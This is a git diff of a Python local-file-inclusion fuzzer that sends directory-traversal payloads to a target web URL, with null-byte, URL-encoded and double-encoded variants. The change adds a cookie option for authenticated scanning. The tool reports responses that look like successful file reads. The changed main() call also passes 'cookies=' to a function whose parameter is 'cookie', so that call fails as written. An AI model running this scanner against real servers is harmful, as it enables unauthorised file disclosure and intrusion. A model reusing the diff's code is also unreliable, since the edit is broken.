@@ -32,7 +32,7 @@ def good_code(code, text):
     return good + text
 
 
-def lfi(url, payload, hcode=(), hsize=(), depth=5):
+def lfi(url, payload, hcode=(), hsize=(), cookie=None, depth=5):
     dds = DDS
     ds = DS
     for _ in range(depth):
@@ -57,24 +57,26 @@ def lfi(url, payload, hcode=(), hsize=(), depth=5):
                     f"{payload}/{dds}{ds}",
                     f"{payload}/{ds}{dds}"]
         for p in payloads:
-            resp = requests.get(f"{url}{p}", headers=USER_AGENT, allow_redirects=False)
+            resp = requests.get(f"{url}{p}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
-                print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
-            resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, allow_redirects=False)
+                print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))                
+            resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
                 print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            resp = requests.get(f"{url}{quote_plus(p)}", headers=USER_AGENT, allow_redirects=False)
+                
             # URLENCODE
+            resp = requests.get(f"{url}{quote_plus(p)}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)            
             if resp.status_code not in hcode and len(resp.content) not in hsize:
-            	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
-            resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, allow_redirects=False)
+            	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
+            resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
             	print(good_code(resp.status_code, f"{quote_plus(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+            	
             # DOUBLE URLENCODE
-            resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, allow_redirects=False)
+            resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
-            	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
-            resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, allow_redirects=False)
+            	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))            	
+            resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
             	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
         dds += DDS
@@ -97,23 +99,26 @@ def lfi(url, payload, hcode=(), hsize=(), depth=5):
                             f"{dds}{ds}{payload}/{dds}",
                             f"{ds}{dds}{payload}/{dds}"]
             for p in payloads_two:                
-                resp = requests.get(f"{url}{p}", headers=USER_AGENT, allow_redirects=False)
+                resp = requests.get(f"{url}{p}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
-                    print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
-                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, allow_redirects=False)
+                    print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))                    
+                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                     print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                    
                 # URLENCODE
+                resp = requests.get(f"{url}{quote_plus(p)}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
-                	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
-                resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, allow_redirects=False)
+                	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))                	
+                resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(good_code(resp.status_code, f"{quote_plus(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                	
                 # DOUBLE URLENCODE
-                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, allow_redirects=False)
+                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
-                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, allow_redirects=False)
+                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
             dds += DDS
@@ -136,23 +141,27 @@ def lfi(url, payload, hcode=(), hsize=(), depth=5):
                             f"{dds}{ds}{payload}/{dds}",
                             f"{ds}{dds}{payload}/{dds}"]
             for p in payloads_two:
-                resp = requests.get(f"{url}{p}", headers=USER_AGENT, allow_redirects=False)
+                resp = requests.get(f"{url}{p}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                     print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
-                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, allow_redirects=False)
+                    
+                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                     print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                    
                 # URLENCODE
+                resp = requests.get(f"{url}{quote_plus(p)}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
-                	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
-                resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, allow_redirects=False)
+                	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))                	
+                resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(good_code(resp.status_code, f"{quote_plus(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                	
                 # DOUBLE URLENCODE
-                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, allow_redirects=False)
+                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
-                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, allow_redirects=False)
+                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
             ds += DS
@@ -175,23 +184,26 @@ def lfi(url, payload, hcode=(), hsize=(), depth=5):
                             f"{dds}{ds}{payload}/{dds}",
                             f"{ds}{dds}{payload}/{dds}"]
             for p in payloads_two:
-                resp = requests.get(f"{url}{p}", headers=USER_AGENT, allow_redirects=False)
+                resp = requests.get(f"{url}{p}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
-                    print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
-                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, allow_redirects=False)
+                    print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))                    
+                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                     print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                    
                 # URLENCODE
+                resp = requests.get(f"{url}{quote_plus(p)}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
-                resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, allow_redirects=False)
+                resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(good_code(resp.status_code, f"{quote_plus(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                	
                 # DOUBLE URLENCODE
-                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, allow_redirects=False)
+                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
-                	print(good_code(resp.status_code, f"{{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
-                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, allow_redirects=False)
+                	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
             ds += DS
@@ -214,12 +226,13 @@ def parse_url(url):
 def main():
     url = None
     path = None
+    cookie = None
     hcode = ()
     hsize = ()
     depth = 5    
     try:
         try:
-            opts, args = getopt.getopt(sys.argv[1:], "u:p:d:", ["url=", "path=", "depth=", "hcode=", "hsize="])
+            opts, args = getopt.getopt(sys.argv[1:], "u:p:d:", ["url=", "path=", "depth=", "hcode=", "hsize=", "cookie="])
             for opt, arg in opts:            
                 if opt in ("-u", "--url"):                    
                     url = arg
@@ -242,7 +255,7 @@ def main():
             print("[!] LFI fuzzing")
             print("----------------\n")
             url = parse_url(url)            
-            lfi(url, path, hcode=hcode, hsize=hsize, depth=depth)
+            lfi(url, path, hcode=hcode, hsize=hsize, cookies=cookie, depth=depth)
         else:
             help()
     except KeyboardInterrupt:
